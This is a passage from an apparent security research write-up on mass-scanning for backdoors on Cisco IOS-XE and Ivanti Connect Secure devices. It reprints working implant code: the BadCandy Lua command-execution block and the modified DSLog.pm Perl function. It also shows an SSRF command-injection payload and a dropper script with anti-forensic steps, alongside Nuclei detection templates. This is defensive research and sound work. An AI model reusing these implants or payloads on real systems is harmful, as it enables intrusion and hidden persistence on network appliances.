                            <span class="kd">local</span> <span class="n">f</span> <span class="o">=</span> <span class="nb">io.popen</span><span class="p">(</span><span class="n">body</span><span class="p">,</span> <span class="s2">"r"</span><span class="p">)</span>
                            <span class="k">if</span> <span class="p">(</span><span class="n">f</span> <span class="o">~=</span> <span class="kc">nil</span><span class="p">)</span> <span class="k">then</span>
                                <span class="n">content</span> <span class="o">=</span> <span class="n">f</span><span class="p">:</span><span class="n">read</span><span class="p">(</span><span class="s2">"*all"</span><span class="p">)</span>
                                <span class="n">f</span><span class="p">:</span><span class="n">close</span><span class="p">()</span>
                            <span class="k">end</span>
                        <span class="k">elseif</span> <span class="p">(</span><span class="n">params</span><span class="p">[</span><span class="s2">"common_type"</span><span class="p">]</span> <span class="o">==</span> <span class="s2">"iox"</span><span class="p">)</span> <span class="k">then</span>
                            <span class="n">ngx</span><span class="p">.</span><span class="n">req</span><span class="p">.</span><span class="n">set_header</span><span class="p">(</span><span class="s2">"Priv-Level"</span><span class="p">,</span> <span class="s2">"15"</span><span class="p">)</span>
                            <span class="kd">local</span> <span class="n">result</span> <span class="o">=</span> <span class="n">ngx</span><span class="p">.</span><span class="n">location</span><span class="p">.</span><span class="n">capture</span><span class="p">(</span><span class="s2">"*/luas"</span><span class="p">,</span> <span class="p">{</span><span class="n">method</span><span class="o">=</span><span class="n">ngx</span><span class="p">.</span><span class="n">HTTP_POST</span><span class="p">,</span> <span class="n">body</span><span class="o">=</span><span class="n">body</span><span class="p">})</span> 
                            <span class="kd">local</span> <span class="n">response</span> <span class="o">=</span> <span class="n">result</span><span class="p">.</span><span class="n">body</span>
                            <span class="k">if</span> <span class="ow">not</span> <span class="p">(</span><span class="n">response</span> <span class="o">==</span> <span class="kc">nil</span> <span class="ow">or</span> <span class="n">response</span> <span class="o">==</span> <span class="mi">0</span><span class="p">)</span> <span class="k">then</span>
                                <span class="n">content</span> <span class="o">=</span> <span class="n">response</span>
                            <span class="k">end</span>
                        <span class="k">end</span>
                    <span class="k">end</span>
                <span class="k">end</span>
            <span class="k">end</span>
            <span class="k">if</span> <span class="p">(</span><span class="n">authorized</span> <span class="o">==</span> <span class="kc">true</span><span class="p">)</span> <span class="k">then</span>
                <span class="n">ngx</span><span class="p">.</span><span class="n">status</span> <span class="o">=</span> <span class="mi">200</span>
                <span class="n">ngx</span><span class="p">.</span><span class="n">say</span><span class="p">(</span><span class="n">content</span><span class="p">)</span>
            <span class="k">else</span>
                <span class="kd">local</span> <span class="n">result</span> <span class="o">=</span> <span class="n">ngx</span><span class="p">.</span><span class="n">location</span><span class="p">.</span><span class="n">capture</span><span class="p">(</span><span class="s2">"/internalWebui/login.html"</span><span class="p">,</span> <span class="p">{</span><span class="n">method</span> <span class="o">=</span> <span class="n">ngx</span><span class="p">.</span><span class="n">HTTP_GET</span><span class="p">})</span>
                <span class="k">if</span> <span class="n">result</span> <span class="k">then</span>
                    <span class="n">ngx</span><span class="p">.</span><span class="n">status</span> <span class="o">=</span> <span class="n">result</span><span class="p">.</span><span class="n">status</span>
                    <span class="k">if</span> <span class="n">result</span><span class="p">.</span><span class="n">body</span> <span class="k">then</span>
                        <span class="n">ngx</span><span class="p">.</span><span class="n">say</span><span class="p">(</span><span class="n">result</span><span class="p">.</span><span class="n">body</span><span class="p">)</span>
                    <span class="k">end</span>
                <span class="k">end</span>
            <span class="k">end</span>
    <span class="p">}</span> 
<span class="p">}</span>
</code></pre></div></div>
<p><span class="centered-text">Listing 5: BadCandy implant for Cisco IOS-XE - version 1</span></p>

<p>Listing 5 shows the full logic of the initial BadCandy implant, disguised as an Nginx config block. In most early instances of the backdoor, if the <code class="language-plaintext highlighter-rouge">?logon_hash=1</code> parameter is set, it will return an 18-character hexadecimal string. If the <code class="language-plaintext highlighter-rouge">common_type</code> parameter is <code class="language-plaintext highlighter-rouge">subsystem</code>, it executes the request body, and if the <code class="language-plaintext highlighter-rouge">common_type</code> parameter is <code class="language-plaintext highlighter-rouge">iox</code>, it will execute on Privilege Level 15. The <code class="language-plaintext highlighter-rouge">login_hash</code> parameter also allowed including a 40-character hash that serves as an authentication mechanism for the command execution functionality.</p>

<p>Around October 20, 2023, a second version of the implant appeared that included an additional authentication mechanism, shown in Listing 6. The second version included a preliminary check for an HTTP Authorization header. Cisco Talos <a href="https://blog.talosintelligence.com/active-exploitation-of-cisco-ios-xe-software/">suspected at the time</a> that this was a reactive measure to prevent the identification of compromised systems. Later, a third version of the BadCandy implant would include an additional check for a <code class="language-plaintext highlighter-rouge">X-Csrf-Token</code> HTTP header in a similar fashion. Strangely enough, the third version would qualify an incoming request as authorized as long as one of the two headers would be correct.</p>

<div class="language-lua highlighter-rouge"><div class="highlight"><pre class="highlight"><code>  <span class="k">if</span> <span class="p">(</span><span class="n">method</span> <span class="o">==</span> <span class="s2">"POST"</span> <span class="ow">and</span> <span class="n">params</span> <span class="o">~=</span> <span class="kc">nil</span><span class="p">)</span> <span class="k">then</span>
      <span class="k">if</span> <span class="p">(</span><span class="n">headers</span><span class="p">[</span><span class="s2">"Authorization"</span><span class="p">]</span> <span class="o">~=</span> <span class="kc">nil</span> <span class="p">)</span> <span class="k">then</span>
          <span class="kd">local</span> <span class="n">authcode</span> <span class="o">=</span> <span class="nb">string.gsub</span><span class="p">(</span><span class="n">headers</span><span class="p">[</span><span class="s2">"Authorization"</span><span class="p">],</span> <span class="s2">"^%s*(.-)%s*$"</span><span class="p">,</span> <span class="s2">"%1"</span><span class="p">)</span>
          <span class="k">if</span> <span class="p">(</span><span class="n">authcode</span> <span class="o">~=</span> <span class="kc">nil</span> <span class="ow">and</span> <span class="nb">string.match</span><span class="p">(</span><span class="n">authcode</span><span class="p">,</span> <span class="s2">"^%w+$"</span><span class="p">)</span> <span class="o">~=</span> <span class="kc">nil</span><span class="p">)</span> <span class="k">then</span>
              <span class="kd">local</span> <span class="n">f</span> <span class="o">=</span> <span class="nb">io.popen</span><span class="p">(</span><span class="s2">""</span><span class="p">,</span><span class="s2">"r"</span><span class="p">)</span>
              <span class="k">if</span> <span class="p">(</span><span class="n">f</span> <span class="o">~=</span> <span class="kc">nil</span><span class="p">)</span> <span class="k">then</span>
                  <span class="kd">local</span> <span class="n">shasum</span> <span class="o">=</span> <span class="n">f</span><span class="p">:</span><span class="n">read</span><span class="p">(</span><span class="s2">"*all"</span><span class="p">)</span>
                  <span class="n">shasum</span> <span class="o">=</span> <span class="nb">string.lower</span><span class="p">(</span><span class="n">shasum</span><span class="p">)</span>
                  <span class="k">if</span> <span class="nb">string.find</span><span class="p">(</span><span class="n">shasum</span><span class="p">,</span> <span class="s2">"&lt;redacted&gt;"</span><span class="p">)</span> <span class="k">then</span>
                      <span class="n">authorized</span> <span class="o">=</span> <span class="kc">true</span>
                  <span class="k">end</span>
                  <span class="n">f</span><span class="p">:</span><span class="n">close</span><span class="p">()</span>
              <span class="k">end</span>
          <span class="k">end</span>
      <span class="k">end</span>
</code></pre></div></div>
<p><span class="centered-text">Listing 6: Introduced Authorization header mechanism to BadCandy</span></p>

<p>After the Proof of Concept (POC) exploit became public on October 30th, exploitation attempts skyrocketed. Most of these attacks were opportunistic, as is common with popular POCs. A generic way of probing systems for the implant without interacting with the backdoor’s core functionality is to make a request to the uri <code class="language-plaintext highlighter-rouge">/%25</code> on the system (as shown in Listing 7). If the implant is listening, it will return an HTTP 404 response (or a decoy login page in the third version). This is what we used at DIVD to scan for compromised devices with the below template. Scanning for the <code class="language-plaintext highlighter-rouge">/webui/logoutconfirm.html</code> endpoint was not an option, as we did not want to interact with the implant’s core functionality and accidentally trigger any unintended effects.</p>

<div class="language-yaml highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="na">id</span><span class="pi">:</span> <span class="s">cisco-ios-implant-detection-CVE-2023-20273</span>
<span class="na">info</span><span class="pi">:</span>
  <span class="na">name</span><span class="pi">:</span> <span class="s">Cisco IOS-XE Mass Exploitation CVE-2023-20273</span>
  <span class="na">author</span><span class="pi">:</span> <span class="s">DIVD-NL</span>
  <span class="na">severity</span><span class="pi">:</span> <span class="s">critical</span>

<span class="na">http</span><span class="pi">:</span>
  <span class="pi">-</span> <span class="na">method</span><span class="pi">:</span> <span class="s">POST</span>
    <span class="na">path</span><span class="pi">:</span>
      <span class="pi">-</span> <span class="s2">"</span><span class="s">{{BaseURL}}/%25"</span>

    <span class="na">matchers</span><span class="pi">:</span>
      <span class="pi">-</span> <span class="na">type</span><span class="pi">:</span> <span class="s">word</span>
        <span class="na">words</span><span class="pi">:</span>
          <span class="pi">-</span> <span class="s2">"</span><span class="s">&lt;head&gt;&lt;title&gt;404</span><span class="nv"> </span><span class="s">Not</span><span class="nv"> </span><span class="s">Found&lt;/title&gt;&lt;/head&gt;"</span>
</code></pre></div></div>
<p><span class="centered-text">Listing 7: Nuclei scanning template to detect BadCandy implants</span></p>

<p>Additionally, after the generic attempt started to lose effectiveness, we would scan for the 18-character string and version number (indicated by <code class="language-plaintext highlighter-rouge">content = "/2010202301/"</code> in Listing 5) that would be returned upon setting the <code class="language-plaintext highlighter-rouge">logon_hash</code> parameter, as shown in Listing 8. The cat- and mouse game that resulted from actors changing the implant, forcing us to change our scanning methodology, interestingly shows a textbook attacker-defender dynamic. Again, patching the vulnerability didn’t mean the system was clean, as the number of compromised appliances skyrocketed shortly after the vulnerability was published.</p>

<div class="language-yaml highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="na">id</span><span class="pi">:</span> <span class="s">cisco-ios-implant-detection-CVE-2023-20273-v2</span>

<span class="na">info</span><span class="pi">:</span>
  <span class="na">name</span><span class="pi">:</span> <span class="s">Cisco IOS-XE Mass Exploitation CVE-2023-20273 v2</span>
  <span class="na">severity</span><span class="pi">:</span> <span class="s">critical</span>

<span class="na">http</span><span class="pi">:</span>
  <span class="pi">-</span> <span class="na">method</span><span class="pi">:</span> <span class="s">POST</span>
    <span class="na">path</span><span class="pi">:</span>
      <span class="pi">-</span> <span class="s2">"</span><span class="s">/webui/logoutconfirm.html?logon_hash=1"</span>

    <span class="na">matchers</span><span class="pi">:</span>
      <span class="pi">-</span> <span class="na">type</span><span class="pi">:</span> <span class="s">regex</span>
        <span class="na">regex</span><span class="pi">:</span>
          <span class="pi">-</span> <span class="s2">"</span><span class="s">.{18}"</span>
        <span class="na">part</span><span class="pi">:</span> <span class="s">body</span>

  <span class="pi">-</span> <span class="na">method</span><span class="pi">:</span> <span class="s">POST</span>
    <span class="na">path</span><span class="pi">:</span>
      <span class="pi">-</span> <span class="s2">"</span><span class="s">/webui/logoutconfirm.html?menu=1"</span>

    <span class="na">matchers</span><span class="pi">:</span>
      <span class="pi">-</span> <span class="na">type</span><span class="pi">:</span> <span class="s">word</span>
        <span class="na">words</span><span class="pi">:</span>
          <span class="pi">-</span> <span class="s2">"</span><span class="s">1010202301"</span>
</code></pre></div></div>
<p><span class="centered-text">Listing 8: Nuclei scanning template to detect BadCandy implants after generic approach no longer worked accurately</span></p>

<h3 id="results-a-mapped-out-global-infection-flare-up">Results: a mapped-out global infection flare-up</h3>
<p>Roughly three weeks after the vulnerability was published, on October 18, 2023, we measured a total of 72.795 backdoored devices. The United States leads the list by a considerable margin, likely due to its large enterprise router footprint and widespread exposure of the Web UI. Southeast Asia and Latin America also show significant concentrations. Compared to the distribution of the Citrix ADC investigation, the countries affected the most seem to be completely different.</p>

<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="o">&gt;&gt;&gt;</span> <span class="n">sorted_data</span> <span class="o">=</span> <span class="nf">dict</span><span class="p">(</span><span class="nf">sorted</span><span class="p">(</span><span class="n">countries</span><span class="p">.</span><span class="nf">items</span><span class="p">(),</span> <span class="n">key</span><span class="o">=</span><span class="k">lambda</span> <span class="n">item</span><span class="p">:</span> <span class="n">item</span><span class="p">[</span><span class="mi">1</span><span class="p">],</span> <span class="n">reverse</span><span class="o">=</span><span class="bp">True</span><span class="p">))</span>
<span class="o">&gt;&gt;&gt;</span> <span class="n">items</span> <span class="o">=</span> <span class="nf">list</span><span class="p">(</span><span class="n">sorted_data</span><span class="p">.</span><span class="nf">items</span><span class="p">())</span>
<span class="p">...</span> <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nf">range</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="mi">20</span><span class="p">,</span> <span class="mi">5</span><span class="p">):</span>
<span class="p">...</span>     <span class="n">line</span> <span class="o">=</span> <span class="n">items</span><span class="p">[</span><span class="n">i</span><span class="p">:</span><span class="n">i</span><span class="o">+</span><span class="mi">5</span><span class="p">]</span>
<span class="p">...</span>     <span class="nf">print</span><span class="p">(</span><span class="sh">"</span><span class="s">  </span><span class="sh">"</span><span class="p">.</span><span class="nf">join</span><span class="p">(</span><span class="sa">f</span><span class="sh">"</span><span class="si">{</span><span class="n">k</span><span class="si">}</span><span class="s">: </span><span class="si">{</span><span class="n">v</span><span class="si">}</span><span class="sh">"</span> <span class="k">for</span> <span class="n">k</span><span class="p">,</span> <span class="n">v</span> <span class="ow">in</span> <span class="n">line</span><span class="p">))</span>
<span class="bp">...</span>
<span class="n">US</span><span class="p">:</span> <span class="mi">5218</span>  <span class="n">PH</span><span class="p">:</span> <span class="mi">3857</span>  <span class="n">CL</span><span class="p">:</span> <span class="mi">2901</span>  <span class="n">MX</span><span class="p">:</span> <span class="mi">2568</span>  <span class="n">IN</span><span class="p">:</span> <span class="mi">2154</span>
<span class="n">TH</span><span class="p">:</span> <span class="mi">1862</span>  <span class="n">PE</span><span class="p">:</span> <span class="mi">1829</span>  <span class="n">BE</span><span class="p">:</span> <span class="mi">1321</span>  <span class="n">AT</span><span class="p">:</span> <span class="mi">1105</span>  <span class="n">BR</span><span class="p">:</span> <span class="mi">1073</span>
<span class="n">CH</span><span class="p">:</span> <span class="mi">1043</span>  <span class="n">SG</span><span class="p">:</span> <span class="mi">986</span>  <span class="n">GB</span><span class="p">:</span> <span class="mi">966</span>  <span class="n">IT</span><span class="p">:</span> <span class="mi">964</span>  <span class="n">AU</span><span class="p">:</span> <span class="mi">875</span>
<span class="n">DE</span><span class="p">:</span> <span class="mi">860</span>  <span class="n">NL</span><span class="p">:</span> <span class="mi">750</span>  <span class="n">EC</span><span class="p">:</span> <span class="mi">714</span>  <span class="n">FR</span><span class="p">:</span> <span class="mi">696</span>  <span class="n">RU</span><span class="p">:</span> <span class="mi">620</span>
</code></pre></div></div>
<p><span class="centered-text">Listing 9: Top 20 countries with BadCandy implants on October 18th, 2023</span></p>

<p>All system owners that were compromised received a notification about the implant, steps to remediate, and advice on how to proceed. While Cisco themselves attempted to bury these numbers, collective effort from the industry brought down the infection rate and number of compromised hosts significantly over the months after.</p>

<h2 id="ivanti-connect-secure---cve-2024-21893">Ivanti Connect Secure - CVE-2024-21893</h2>
<p>A few months later, on January 31st, 2024, Ivanti <a href="https://www.ivanti.com/blog/security-update-for-ivanti-connect-secure-and-ivanti-policy-secure-gateways">released</a> fixes to address four vulnerabilities. One of these, CVE-2024-21893, which is a Server-Side Request Forgery (SSRF) vulnerability that affected the SAML module. Researchers from Rapid7 and AssetNote released a working POC that anyone could use and within hours of its release, attacks were identified targeting this SAML vulnerability. One of the first to publish a report on the implants resulting from these attacks was <a href="https://www.orangecyberdefense.com/global/blog/research/ivanti-connect-secure-discover-the-dslog-backdoor">Orange Cyberdefense</a>, who named it the DSLog backdoor.</p>

<p>As with the previous cases, post-exploitation scanning revealed compromises that would have gone unnoticed by standard vulnerability checks.</p>

<h3 id="scanning-for-the-backdoors-2">Scanning for the Backdoors</h3>
<p>An important aspect of scanning for the DSLog backdoor is the first stage of the exploit, shown in Listing 9. The payload outputs either a set of random characters or the output of <code class="language-plaintext highlighter-rouge">uname -a</code> to a publicly accessible file (index.txt, index1.txt, index2.txt, etc.). This seemed to be reconnaissance activity (shown in Listing 10) to confirm that the exploit worked on the target device, an idea that is corroborated by Orange Cyberdefense. Interestingly, in 1cases where the attackers cleared the log files, the <code class="language-plaintext highlighter-rouge">uname -a</code> output offered a timestamp on the time of compromise, which is temporal evidence for the breach.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c"># Base64 encoded request</span>
https://127.0.0.1:8090/api/v1/license/keys-status/<span class="p">;</span><span class="nb">echo </span>ZWNobyAkKHVuYW1lIC1hO2lkKT4vaG9tZS93ZWJzZXJ2ZXIvaHRkb2NzL2RhbmEtbmEvaW1ncy9pbmRleDIudHh0|/usr/bin/base64 <span class="nt">-d</span> | /bin/bash<span class="p">;</span>

<span class="c"># Decoded command</span>
https://127.0.0.1:8090/api/v1/license/keys-status/<span class="p">;</span><span class="nb">echo</span> <span class="si">$(</span><span class="nb">uname</span> <span class="nt">-a</span><span class="p">;</span><span class="nb">id</span><span class="si">)</span><span class="o">&gt;</span>/home/webserver/htdocs/dana-na/imgs/index2.txt|/usr/bin/base64 <span class="nt">-d</span> | /bin/bash<span class="p">;</span>

<span class="c"># Output in index2.txt</span>
Linux localhost2 2.6.32-00032-g2005e8d-dirty <span class="c">#1 SMP Thu Jun 22 03:40:39 EDT 2023 x86_64 x86_64 x86_64 GNU/Linux uid=0(root) gid=0(root) groups=0(root)</span>
</code></pre></div></div>
<p><span class="centered-text">Listing 10: SSRF payload for CVE-2024-21893</span></p>

<p>With the knowledge of now, the methodology and characteristics of the backdoor <a href="https://cloud.google.com/blog/topics/threat-intelligence/china-nexus-exploiting-critical-ivanti-vulnerability">closely resemble</a> the suspected China-nexus espionage actor tracked as UNC5221 (Mandiant) or UTA0178 (Volexity). At the time, IBM <a href="https://www.ibm.com/think/x-force/exploitation-of-exposed-ivanti-vulnerabilities">wrote a blogpost</a> that mentioned the involvement of UNC5221 based on other reporting, but also admitted they could not corroborate these findings with sufficient confidence. The type, way of dropping, and chosen locations of the webshell seem to be similar to the later Ivanti Connect Secure webshells attributed to UNC5221, such as the webshells related to <a href="https://cloud.google.com/blog/topics/threat-intelligence/ivanti-post-exploitation-lateral-movement">SPAWNANT</a> installer and <a href="https://cloud.google.com/blog/topics/threat-intelligence/ivanti-connect-secure-vpn-zero-day">PHASEJAM</a> dropper.</p>

<div class="language-perl highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">sub </span><span class="nf">Msg</span> <span class="p">{</span>
  <span class="k">my</span> <span class="p">(</span><span class="nv">$event</span><span class="p">,</span> <span class="nv">$level</span><span class="p">,</span> <span class="nv">$data</span><span class="p">)</span> <span class="o">=</span> <span class="nv">@_</span><span class="p">;</span>
  <span class="k">my</span> <span class="p">(</span><span class="nv">$pkg</span><span class="p">,</span> <span class="nv">$file</span><span class="p">,</span> <span class="nv">$line</span><span class="p">)</span> <span class="o">=</span> <span class="nb">caller</span><span class="p">;</span>
  <span class="k">my</span> <span class="nv">$ua</span> <span class="o">=</span> <span class="nv">$ENV</span><span class="p">{</span><span class="nv">HTTP_USER_AGENT</span><span class="p">};</span>
  <span class="k">my</span> <span class="nv">$req</span> <span class="o">=</span> <span class="nv">$ENV</span><span class="p">{</span><span class="nv">QUERY_STRING</span><span class="p">};</span>
  <span class="k">my</span> <span class="nv">$qur</span> <span class="o">=</span> <span class="p">"</span><span class="s2">&lt;redacted&gt;</span><span class="p">";</span>
  <span class="k">my</span> <span class="nv">@param</span> <span class="o">=</span> <span class="nb">split</span><span class="p">(</span><span class="sr">/&amp;/</span><span class="p">,</span> <span class="nv">$req</span><span class="p">);</span>
  <span class="k">if</span> <span class="p">(</span><span class="nb">index</span><span class="p">(</span><span class="nv">$ua</span><span class="p">,</span> <span class="nv">$qur</span><span class="p">)</span> <span class="o">!=</span> <span class="o">-</span><span class="mi">1</span><span class="p">)</span> <span class="p">{</span>
    <span class="k">if</span> <span class="p">(</span><span class="nv">$param</span><span class="p">[</span><span class="mi">1</span><span class="p">]){</span>
      <span class="k">my</span> <span class="nv">@res</span> <span class="o">=</span> <span class="nb">split</span><span class="p">(</span><span class="sr">/=/</span><span class="p">,</span> <span class="nv">$param</span><span class="p">[</span><span class="mi">1</span><span class="p">]);</span>
      <span class="k">if</span> <span class="p">(</span><span class="nv">$res</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="ow">eq</span> <span class="p">"</span><span class="s2">cdi</span><span class="p">"){</span>  <span class="c1"># Include command in cdi parameter</span>
        <span class="nv">$res</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span> <span class="o">=~</span> <span class="sr">s/([a-fA-F0-9][a-fA-F0-9])/chr(hex($1))/</span><span class="nv">eg</span><span class="p">;</span>
        <span class="nv">$res</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span> <span class="o">=~</span> <span class="sr">tr/!-~/P-~!-O/</span><span class="p">;</span>
        <span class="nb">system</span><span class="p">(</span><span class="nv">$</span><span class="p">{</span><span class="nv">res</span><span class="p">[</span><span class="mi">1</span><span class="p">]});</span>
      <span class="p">}</span>
    <span class="p">}</span>
  <span class="p">}</span>
  <span class="nv">$file</span> <span class="o">=</span> <span class="nb">substr</span> <span class="p">(</span><span class="nv">$file</span><span class="p">,</span> <span class="nb">rindex</span> <span class="p">(</span><span class="nv">$file</span><span class="p">,</span> <span class="p">"</span><span class="s2">/</span><span class="p">")</span><span class="o">+</span><span class="mi">1</span><span class="p">);</span>
  <span class="c1"># Prevent C printf format codes to make it through...</span>
  <span class="nv">$data</span> <span class="o">=~</span> <span class="sr">s/%/%%/g</span><span class="p">;</span>
  <span class="nv">Msg_impl</span> <span class="p">(</span><span class="nv">$file</span><span class="p">,</span> <span class="nv">$line</span><span class="p">,</span> <span class="nv">$event</span><span class="p">,</span> <span class="nv">$level</span><span class="p">,</span> <span class="nv">$data</span><span class="p">);</span>
<span class="p">}</span>

</code></pre></div></div>
<p><span class="centered-text">Listing 11: Modified function in the /home/perl/DSLog.pm file</span></p>

<p>Listing 11 shows the altered <code class="language-plaintext highlighter-rouge">Msg()</code> function on line 102 in the <code class="language-plaintext highlighter-rouge">/home/perl/DSLog.pm</code> file that includes the implant. DSLog.pm is normally a legitimate script that is used to log events on the Ivanti appliance. Commands can be executed through the shell by adding the (URL-encoded) command to the request with the <code class="language-plaintext highlighter-rouge">cdi</code> parameter. The added code is injected using the exploit shown in Listing 10, but this time with the base64-encoded payload shown in Listing 12. The payload checks if the device has already been infected, after which it writes the implant to the DSLog file and performs some anti-forensics.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c"># Set paths to target files</span>
<span class="nv">DESTFILE</span><span class="o">=</span><span class="s2">"/home/perl/DSLog.pm"</span>
<span class="nv">CLFILE</span><span class="o">=</span><span class="s2">"/home/perl/DSLogMB.pm"</span>

<span class="c"># Check if the file already contains HTTP_USER_AGENT</span>
<span class="k">if </span><span class="nb">cat</span> <span class="s2">"</span><span class="nv">$DESTFILE</span><span class="s2">"</span> | <span class="nb">grep</span> <span class="nt">-q</span> <span class="s1">'HTTP_USER_AGENT'</span><span class="p">;</span> <span class="k">then
    </span><span class="nb">echo</span> <span class="s1">'OK'</span>
<span class="k">else</span>
    <span class="c"># Inject Perl code starting at line 102</span>
    <span class="nb">sed</span> <span class="nt">-i</span> <span class="s1">'102i\
my $ua = $ENV{HTTP_USER_AGENT};\
my $req = $ENV{QUERY_STRING};\
my $qur = "&lt;redacted&gt;";\
my @param = split(/&amp;/, $req);\
if (index($ua, $qur) != -1) {\
    if ($param[1]) {\
        my @res = split(/=|,/, $param[1]);\
        if ($res[0] eq "cdi") {\
            $res[1] =~ s/([a-fA-F0-9][a-fA-F0-9])/chr(hex($1))/eg;\
            $res[1] =~ tr/!-/P-~/P-~.!-O/;\
            system($res[1]);\
        }\
    }\
}'</span> <span class="s2">"</span><span class="nv">$DESTFILE</span><span class="s2">"</span>
<span class="k">fi</span>

<span class="c"># Sync timestamp of DESTFILE to match CLFILE (anti-forensics)</span>
<span class="nb">touch</span> <span class="nt">-r</span> <span class="s2">"</span><span class="nv">$CLFILE</span><span class="s2">"</span> <span class="s2">"</span><span class="nv">$DESTFILE</span><span class="s2">"</span>

<span class="c"># Clear crash dump traces</span>
<span class="nb">rm</span> <span class="nt">-rf</span> /var/cores/<span class="k">*</span>

<span class="c"># Run a Python warm restart with shellcode injection via base64 decoding</span>
/home/venv3/bin/python3 <span class="nt">-c</span> <span class="s1">'import DSMonitor; DSMonitor.warmRestart()'</span> | /usr/bin/base64 <span class="nt">-d</span> | /bin/bash
</code></pre></div></div>
<p><span class="centered-text">Listing 12: Exploit payload to drop the implant</span></p>

<p>Because the implant contains a unique key (SHA256 hash) that needs to be included in the User Agent to execute commands, there was no way to directly interact with it. However, the initial stage of the compromise included the creation of a publicly available file that contained predictable output. Therefore, this offered a scanning methodology to at least gain an indication that the implant had been present on the system.</p>

<div class="language-yaml highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="na">id</span><span class="pi">:</span> <span class="s">CVE-2024-21893</span>

<span class="na">info</span><span class="pi">:</span>
  <span class="na">name</span><span class="pi">:</span> <span class="s">DSLog backdoor Ivanti Connect Secure</span>
  <span class="na">author</span><span class="pi">:</span> <span class="s">DIVD-NL</span>
  <span class="na">severity</span><span class="pi">:</span> <span class="s">critical</span>

<span class="na">variables</span><span class="pi">:</span>
  <span class="na">index</span><span class="pi">:</span> <span class="pi">[</span><span class="s2">"</span><span class="s">index.txt"</span><span class="pi">,</span> <span class="s2">"</span><span class="s">index1.txt"</span><span class="pi">,</span> <span class="s2">"</span><span class="s">index2.txt"</span><span class="pi">,</span> <span class="s2">"</span><span class="s">index3.txt"</span><span class="pi">,</span> <span class="s2">"</span><span class="s">index4.txt"</span><span class="pi">]</span>

<span class="na">requests</span><span class="pi">:</span>
  <span class="pi">-</span> <span class="na">method</span><span class="pi">:</span> <span class="s">GET</span>
    <span class="na">path</span><span class="pi">:</span>
      <span class="pi">-</span> <span class="s2">"</span><span class="s">/dana-na/imgs/"</span>

    <span class="na">matchers-condition</span><span class="pi">:</span> <span class="s">and</span>
    <span class="na">matchers</span><span class="pi">:</span>
      <span class="pi">-</span> <span class="na">type</span><span class="pi">:</span> <span class="s">word</span>
        <span class="na">words</span><span class="pi">:</span>
          <span class="pi">-</span> <span class="s2">"</span><span class="s">WatchGuard"</span>
        <span class="na">part</span><span class="pi">:</span> <span class="s">body</span>
        <span class="na">negative</span><span class="pi">:</span> <span class="kc">true</span>

      <span class="pi">-</span> <span class="na">type</span><span class="pi">:</span> <span class="s">dsl</span>
        <span class="na">dsl</span><span class="pi">:</span>
          <span class="pi">-</span> <span class="s2">"</span><span class="s">len(body)</span><span class="nv"> </span><span class="s">&gt;</span><span class="nv"> </span><span class="s">0</span><span class="nv"> </span><span class="s">&amp;&amp;</span><span class="nv"> </span><span class="s">status_code</span><span class="nv"> </span><span class="s">==</span><span class="nv"> </span><span class="s">200"</span>
</code></pre></div></div>
<p><span class="centered-text">Listing 13: Nuclei scanning template for the DSLog implant</span></p>

<p>These files offered sufficient coverage to locate the DSLog backdoor in a scanning campaign. We did not have to approach the implant itself, which is always important from the ethics perspective. Instead of probing the implant directly, we scanned for signs of dropped index files using the method in Listing 13. Normally, the Ivanti Connect Secure appliances will return an HTTP 404 upon making a request to an endpoint that does not exist. Therefore, by scanning for HTTP 200 responses on the known indicators and verifying the content of the response, public systems could be scanned for this webshell. The only thing to take into account is to filter out the occasional WatchGuard WAF response.</p>

<h3 id="results-little-but-interesting-targets">Results: little but interesting targets</h3>
<p>Two weeks after the vulnerability became public, on February 12th, 2024, we conducted a scan for the DSLog backdoor and found 50 backdoored instances in 17 countries. With such little results, it becomes interesting to look at the types of organizations that were backdoored. In this instance, most organizations that were compromised seemed to belong to either the steel, healthcare (robotics), telecommunications, or banking sector.</p>

<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="o">&gt;&gt;&gt;</span> <span class="n">sorted_data</span> <span class="o">=</span> <span class="nf">dict</span><span class="p">(</span><span class="nf">sorted</span><span class="p">(</span><span class="n">countries</span><span class="p">.</span><span class="nf">items</span><span class="p">(),</span> <span class="n">key</span><span class="o">=</span><span class="k">lambda</span> <span class="n">item</span><span class="p">:</span> <span class="n">item</span><span class="p">[</span><span class="mi">1</span><span class="p">],</span> <span class="n">reverse</span><span class="o">=</span><span class="bp">True</span><span class="p">))</span>
<span class="o">&gt;&gt;&gt;</span> <span class="n">items</span> <span class="o">=</span> <span class="nf">list</span><span class="p">(</span><span class="n">sorted_data</span><span class="p">.</span><span class="nf">items</span><span class="p">())</span>
<span class="p">...</span> <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nf">range</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="mi">20</span><span class="p">,</span> <span class="mi">5</span><span class="p">):</span>
<span class="p">...</span>     <span class="n">line</span> <span class="o">=</span> <span class="n">items</span><span class="p">[</span><span class="n">i</span><span class="p">:</span><span class="n">i</span><span class="o">+</span><span class="mi">5</span><span class="p">]</span>
<span class="p">...</span>     <span class="nf">print</span><span class="p">(</span><span class="sh">"</span><span class="s">  </span><span class="sh">"</span><span class="p">.</span><span class="nf">join</span><span class="p">(</span><span class="sa">f</span><span class="sh">"</span><span class="si">{</span><span class="n">k</span><span class="si">}</span><span class="s">: </span><span class="si">{</span><span class="n">v</span><span class="si">}</span><span class="sh">"</span> <span class="k">for</span> <span class="n">k</span><span class="p">,</span> <span class="n">v</span> <span class="ow">in</span> <span class="n">line</span><span class="p">))</span>
<span class="bp">...</span>
<span class="n">US</span><span class="p">:</span> <span class="mi">18</span>  <span class="n">JP</span><span class="p">:</span> <span class="mi">6</span>  <span class="n">KR</span><span class="p">:</span> <span class="mi">4</span>  <span class="n">HK</span><span class="p">:</span> <span class="mi">3</span>  <span class="n">SG</span><span class="p">:</span> <span class="mi">2</span>
